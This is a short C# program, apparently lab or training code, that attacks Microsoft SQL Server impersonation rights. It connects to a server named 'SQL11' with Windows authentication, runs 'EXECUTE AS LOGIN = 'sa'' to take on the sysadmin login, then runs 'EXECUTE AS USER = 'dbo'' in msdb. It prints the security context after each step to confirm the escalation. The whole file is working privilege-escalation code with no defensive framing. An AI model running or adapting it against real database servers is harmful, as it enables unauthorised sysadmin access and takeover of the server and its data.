using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "SQL11";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;";
            String queryuname = "SELECT USER_NAME();";

            Console.WriteLine("Before impersonation");
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();

            String executeas = "EXECUTE AS LOGIN = 'sa';";
            
            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader();
            reader.Close();
            
            Console.WriteLine("After impersonation");
            
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();

            String executeas1 = "use msdb; EXECUTE AS USER = 'dbo';";

            command = new SqlCommand(executeas1, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(queryuname, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}